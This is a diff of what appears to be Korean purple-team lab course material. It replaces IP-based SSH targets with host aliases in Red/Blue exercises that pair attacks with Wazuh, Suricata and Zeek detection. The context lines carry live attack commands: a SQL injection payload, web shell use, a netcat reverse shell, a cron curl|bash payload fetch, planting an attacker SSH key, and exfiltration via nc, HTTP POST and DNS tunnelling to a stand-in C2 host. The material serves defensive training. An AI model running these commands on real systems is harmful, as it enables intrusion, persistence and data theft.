@@ -265,7 +265,7 @@ sleep 2
 
 echo ""
 echo "  [BLUE] Wazuh 경보 확인..."
-ssh ccc@10.20.30.100 \
+ssh 6v6-siem \
   "tail -20 /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -i 'whoami\|uname\|discovery'" 2>/dev/null || \
   echo "  → 탐지 결과: 확인 필요"
 
@@ -278,7 +278,7 @@ sleep 2
 
 echo ""
 echo "  [BLUE] Wazuh 경보 확인..."
-ssh ccc@10.20.30.100 \
+ssh 6v6-siem \
   "tail -20 /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -i 'cron'" 2>/dev/null || \
   echo "  → 탐지 결과: 확인 필요"
 ```
@@ -338,7 +338,7 @@ curl -s -H "X-API-Key: $BASTION_API_KEY" \
 
 ```bash
 # 탐지 격차에서 발견된 미탐 기법에 대한 룰 추가
-ssh ccc@10.20.30.100 << 'REMOTE'
+ssh 6v6-siem << 'REMOTE'
 
 sudo tee -a /var/ossec/etc/rules/local_rules.xml << 'RULES'
 
@@ -1127,8 +1127,8 @@ ssh ccc@$ATTACKER 'sqlmap -u "http://10.20.30.80/rest/products/search?q=*" --bat
 ssh ccc@$ATTACKER 'curl -s "http://10.20.30.80/rest/products/search?q=\\\")) UNION SELECT id,email,password,\\'4\\',\\'5\\',\\'6\\',\\'7\\',\\'8\\',\\'9\\' FROM Users--"'
 
 # Blue 실시간 모니터링
-ssh ccc@10.20.30.100 'sudo tail -f /var/ossec/logs/alerts/alerts.json | jq -r "select(.rule.id==\"100200\" or .rule.id==\"100250\") | {ts:.timestamp,src:.data.srcip,desc:.rule.description}"'
-ssh ccc@10.20.30.1 'sudo tail -f /var/log/suricata/eve.json | jq -r "select(.event_type==\"alert\" and .alert.signature_id >= 2003001) | {ts:.timestamp,src:.src_ip,sig:.alert.signature}"'
+ssh 6v6-siem 'sudo tail -f /var/ossec/logs/alerts/alerts.json | jq -r "select(.rule.id==\"100200\" or .rule.id==\"100250\") | {ts:.timestamp,src:.data.srcip,desc:.rule.description}"'
+ssh 6v6-fw 'sudo tail -f /var/log/suricata/eve.json | jq -r "select(.event_type==\"alert\" and .alert.signature_id >= 2003001) | {ts:.timestamp,src:.src_ip,sig:.alert.signature}"'
 ```
 
 | 시도 | Wazuh | Suricata | 비고 |
@@ -1148,9 +1148,9 @@ ssh ccc@$ATTACKER 'weevely http://10.20.30.80/uploads/shell.php s3cret'
 # > id; whoami; cat /etc/passwd; nc -e /bin/sh 192.168.1.50 4444
 
 # Blue
-ssh ccc@10.20.30.100 'sudo grep "100450" /var/ossec/logs/alerts/alerts.log | tail'
-ssh ccc@10.20.30.1 'sudo grep -i "shell.php" /var/log/suricata/eve.json | head'
-ssh ccc@10.20.30.80 'sudo grep "shell.php" /var/log/apache2/access.log | tail'
+ssh 6v6-siem 'sudo grep "100450" /var/ossec/logs/alerts/alerts.log | tail'
+ssh 6v6-fw 'sudo grep -i "shell.php" /var/log/suricata/eve.json | head'
+ssh 6v6-web 'sudo grep "shell.php" /var/log/apache2/access.log | tail'
 ```
 
 | 시도 | Wazuh | Suricata | Apache | 비고 |
@@ -1167,7 +1167,7 @@ ssh ccc@web 'echo "*/5 * * * * curl -s http://192.168.1.50/payload.sh | bash" | 
 ssh ccc@web 'mkdir -p /home/ccc/.ssh && echo "ssh-rsa AAAA... attacker@kali" >> /home/ccc/.ssh/authorized_keys'
 
 # Blue
-ssh ccc@10.20.30.100 'sudo grep "5106" /var/ossec/logs/alerts/alerts.log | tail'
+ssh 6v6-siem 'sudo grep "5106" /var/ossec/logs/alerts/alerts.log | tail'
 ssh ccc@web 'sudo ausearch -k cron_change --start recent | head'
 ssh ccc@web 'sudo ausearch -k home_change --start recent | head'
 ```
@@ -1183,10 +1183,10 @@ ssh ccc@web 'sudo ausearch -k home_change --start recent | head'
 ```bash
 # Red
 ssh ccc@web 'ssh -i /home/ccc/.ssh/id_rsa ccc@10.20.30.100 "id; ls /var/ossec/etc/"'
-ssh ccc@web 'sshpass -p ccc123 ssh ccc@10.20.30.100 id'
+ssh ccc@web 'sshpass -p ccc123 ssh 6v6-siem id'
 
 # Blue
-ssh ccc@10.20.30.100 'sudo grep "5715" /var/ossec/logs/alerts/alerts.log | grep "10.20.30.80" | tail'
+ssh 6v6-siem 'sudo grep "5715" /var/ossec/logs/alerts/alerts.log | grep "10.20.30.80" | tail'
 ```
 
 | 시도 | Wazuh | 비고 |
@@ -1198,13 +1198,13 @@ ssh ccc@10.20.30.100 'sudo grep "5715" /var/ossec/logs/alerts/alerts.log | grep 
 
 ```bash
 # 1. tar + nc
-ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data 2>/dev/null | nc 192.168.1.50 4444'
+ssh 6v6-siem 'tar -czf - /var/ossec/data 2>/dev/null | nc 192.168.1.50 4444'
 
 # 2. HTTP POST
-ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data | curl -X POST -H "Content-Type: application/octet-stream" --data-binary @- http://192.168.1.50/upload'
+ssh 6v6-siem 'tar -czf - /var/ossec/data | curl -X POST -H "Content-Type: application/octet-stream" --data-binary @- http://192.168.1.50/upload'
 
 # 3. DNS 터널 (week06)
-ssh ccc@10.20.30.100 '
+ssh 6v6-siem '
   while read line; do
     encoded=$(echo "$line" | base64)
     dig +short ${encoded:0:30}.tunnel.evil-c2.example >/dev/null
@@ -1212,11 +1212,11 @@ ssh ccc@10.20.30.100 '
 '
 
 # 4. 암호화 + age + nc
-ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data | age -r age1abc... | nc 192.168.1.50 4444'
+ssh 6v6-siem 'tar -czf - /var/ossec/data | age -r age1abc... | nc 192.168.1.50 4444'
 
 # Blue
-ssh ccc@10.20.30.1 'sudo zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes < /var/log/zeek/conn.log | awk "$3 > 10485760"'
-ssh ccc@10.20.30.1 'sudo zeek-cut query < /var/log/zeek/dns.log | awk "{ if (length($1) > 50) print }"'
+ssh 6v6-fw 'sudo zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes < /var/log/zeek/conn.log | awk "$3 > 10485760"'
+ssh 6v6-fw 'sudo zeek-cut query < /var/log/zeek/dns.log | awk "{ if (length($1) > 50) print }"'
 ```
 
 | 시도 | Suricata | Wazuh | Zeek | 비고 |
@@ -1293,7 +1293,7 @@ ssh ccc@web 'sudo tee -a /var/ossec/etc/ossec.conf' << 'XML'
 </syscheck>
 XML
 
-ssh ccc@10.20.30.100 'sudo tee -a /var/ossec/etc/rules/local_rules.xml' << 'XML'
+ssh 6v6-siem 'sudo tee -a /var/ossec/etc/rules/local_rules.xml' << 'XML'
 <group name="custom,persistence,">
   <rule id="100850" level="13">
     <if_sid>550,553</if_sid>
@@ -1330,12 +1330,12 @@ ssh ccc@10.20.30.100 'sudo tee -a /var/ossec/etc/rules/local_rules.xml' << 'XML'
 </group>
 XML
 
-ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control restart'
+ssh 6v6-siem 'sudo /var/ossec/bin/wazuh-control restart'
 
 # 재시뮬
 ssh ccc@web 'echo "ssh-rsa AAAA... new" >> /home/ccc/.ssh/authorized_keys'
 sleep 30
-ssh ccc@10.20.30.100 'sudo grep "100850" /var/ossec/logs/alerts/alerts.log | tail'
+ssh 6v6-siem 'sudo grep "100850" /var/ossec/logs/alerts/alerts.log | tail'
 ```
 
 | Technique | Before | After | Δ |
@@ -1546,10 +1546,10 @@ ssh ccc@$ATTACKER 'sqlmap -u "..." --batch'
 ssh ccc@$ATTACKER 'curl -X POST "http://10.20.30.80/api/Files" ...'
 ssh ccc@web 'echo "..." | sudo tee /etc/cron.d/backup'
 ssh ccc@web 'ssh -i id_rsa ccc@10.20.30.100 id'
-ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data | nc 192.168.1.50 4444'
+ssh 6v6-siem 'tar -czf - /var/ossec/data | nc 192.168.1.50 4444'
 
 # 실시간 모니터링
-ssh ccc@10.20.30.100 'sudo tail -f /var/ossec/logs/alerts/alerts.json | jq -r "select(.rule.mitre.id != null)"'
+ssh 6v6-siem 'sudo tail -f /var/ossec/logs/alerts/alerts.json | jq -r "select(.rule.mitre.id != null)"'
 ```
 
 #### Phase B — 매트릭스 + 갭 (s8·s9)
@@ -1562,8 +1562,8 @@ python /tmp/dettect/dettect.py v -ft /tmp/visibility-current.yaml -l
 #### Phase C — 개선 + 재시뮬 + 보고 (s10·s11·s12·s13·s14·s15)
 
 ```bash
-ssh ccc@10.20.30.100 'sudo vi /var/ossec/etc/rules/local_rules.xml'
-ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control restart'
+ssh 6v6-siem 'sudo vi /var/ossec/etc/rules/local_rules.xml'
+ssh 6v6-siem 'sudo /var/ossec/bin/wazuh-control restart'
 
 sudo /tmp/run-atomic-purple.sh
 
